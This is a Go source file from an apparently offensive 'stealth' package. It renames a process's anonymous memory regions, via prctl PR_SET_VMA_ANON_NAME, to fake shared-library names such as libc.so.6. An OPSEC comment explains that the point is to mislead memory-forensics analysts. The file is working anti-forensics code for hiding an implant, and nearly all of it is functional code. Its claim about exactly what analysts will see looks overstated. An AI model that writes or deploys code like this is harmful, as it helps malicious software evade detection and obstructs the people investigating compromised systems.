package stealth

import (
	"fmt"
	"os"
	"syscall"
	"unsafe"
)

// Memory-Region Spoofing
//
// OPSEC rationale: Memory forensics tools (LiME, gcore, /proc/pid/maps) inspect
// the process memory layout. Go binaries have distinctive anonymous executable
// regions ([heap], unnamed rwx regions) that look nothing like a C service.
// PR_SET_VMA_ANON_NAME lets us rename these regions to look like legitimate
// shared libraries. An analyst inspecting /proc/pid/maps sees "libc-2.31.so"
// instead of suspicious anonymous regions.

const (
	prSetVMA     = 0x53564d41 // PR_SET_VMA
	prSetVMAName = 0          // PR_SET_VMA_ANON_NAME
)

// MemRegionSpoof renames anonymous memory regions to look legitimate.
type MemRegionSpoof struct {
	Regions []SpoofedRegion
}

// SpoofedRegion represents a memory region we've renamed.
type SpoofedRegion struct {
	Start    uintptr
	End      uintptr
	OrigName string
	FakeName string
}

// LegitimateLibraryNames are names that won't raise suspicion in /proc/pid/maps.
var LegitimateLibraryNames = []string{
	"[heap]",
	"libc.so.6",
	"libpthread.so.0",
	"libdl.so.2",
	"libm.so.6",
	"librt.so.1",
	"libcrypto.so.3",
	"libssl.so.3",
	"libz.so.1",
	"libpcre2-8.so.0",
	"ld-linux-x86-64.so.2",
	"libsystemd.so.0",
	"libgcc_s.so.1",
	"libstdc++.so.6",
}

// RenameAnonymousRegions reads /proc/self/maps and renames anonymous
// executable/writable regions to look like known libraries.
func RenameAnonymousRegions() (*MemRegionSpoof, error) {
	spoof := &MemRegionSpoof{}

	regions, err := parseMemoryMaps()
	if err != nil {
		return nil, err
	}

	nameIdx := 0
	for _, region := range regions {
		// Target anonymous regions (no file backing) that are executable or writable
		if region.Path != "" && region.Path[0] != '[' {
			continue // file-backed region — skip
		}

		if region.Path == "[stack]" || region.Path == "[vvar]" || region.Path == "[vdso]" || region.Path == "[vsyscall]" {
			continue // kernel-managed — can't rename
		}

		// Rename this region
		fakeName := LegitimateLibraryNames[nameIdx%len(LegitimateLibraryNames)]
		nameIdx++

		if err := setVMAName(region.Start, region.End-region.Start, fakeName); err != nil {
			continue // non-fatal
		}

		spoof.Regions = append(spoof.Regions, SpoofedRegion{
			Start:    region.Start,
			End:      region.End,
			OrigName: region.Path,
			FakeName: fakeName,
		})
	}

	return spoof, nil
}

// setVMAName calls prctl(PR_SET_VMA, PR_SET_VMA_ANON_NAME, addr, len, name)
// to rename an anonymous memory region.
func setVMAName(addr uintptr, length uintptr, name string) error {
	nameBytes := append([]byte(name), 0) // null terminate

	_, _, errno := syscall.RawSyscall6(
		syscall.SYS_PRCTL,
		prSetVMA,
		prSetVMAName,
		addr,
		length,
		uintptr(unsafe.Pointer(&nameBytes[0])),
		0,
	)
	if errno != 0 {
		return fmt.Errorf("PR_SET_VMA: %v", errno)
	}
	return nil
}

// MemoryRegion represents a parsed entry from /proc/self/maps.
type MemoryRegion struct {
	Start uintptr
	End   uintptr
	Perms string
	Path  string
}

// parseMemoryMaps reads and parses /proc/self/maps.
func parseMemoryMaps() ([]MemoryRegion, error) {
	data, err := os.ReadFile("/proc/self/maps")
	if err != nil {
		return nil, err
	}

	var regions []MemoryRegion

	start := 0
	for i := 0; i <= len(data); i++ {
		if i == len(data) || data[i] == '\n' {
			if i > start {
				region := parseMapsLine(string(data[start:i]))
				if region != nil {
					regions = append(regions, *region)
				}
			}
			start = i + 1
		}
	}

	return regions, nil
}

// parseMapsLine parses a single line from /proc/self/maps.
// Format: "start-end perms offset dev inode pathname"
func parseMapsLine(line string) *MemoryRegion {
	if len(line) == 0 {
		return nil
	}

	region := &MemoryRegion{}

	// Parse start-end
	dashIdx := -1
	for i := 0; i < len(line); i++ {
		if line[i] == '-' {
			dashIdx = i
			break
		}
	}
	if dashIdx < 0 {
		return nil
	}

	region.Start = parseHex(line[:dashIdx])

	// Find space after end address
	spaceIdx := -1
	for i := dashIdx + 1; i < len(line); i++ {
		if line[i] == ' ' {
			region.End = parseHex(line[dashIdx+1 : i])
			spaceIdx = i
			break
		}
	}
	if spaceIdx < 0 {
		return nil
	}

	// Parse perms (next field)
	nextSpace := -1
	for i := spaceIdx + 1; i < len(line); i++ {
		if line[i] == ' ' {
			region.Perms = line[spaceIdx+1 : i]
			nextSpace = i
			break
		}
	}
	if nextSpace < 0 {
		return nil
	}

	// Skip offset, dev, inode — find the pathname (last field after spaces)
	fieldCount := 0
	lastFieldStart := -1
	inSpace := true
	for i := nextSpace; i < len(line); i++ {
		if line[i] == ' ' {
			inSpace = true
		} else {
			if inSpace {
				fieldCount++
				if fieldCount >= 4 { // offset(1) + dev(2) + inode(3) + path(4+)
					lastFieldStart = i
					break
				}
			}
			inSpace = false
		}
	}

	if lastFieldStart > 0 {
		region.Path = line[lastFieldStart:]
	}

	return region
}

// parseHex converts a hex string to uintptr.
func parseHex(s string) uintptr {
	var result uintptr
	for _, c := range s {
		result <<= 4
		if c >= '0' && c <= '9' {
			result |= uintptr(c - '0')
		} else if c >= 'a' && c <= 'f' {
			result |= uintptr(c - 'a' + 10)
		} else if c >= 'A' && c <= 'F' {
			result |= uintptr(c - 'A' + 10)
		}
	}
	return result
}
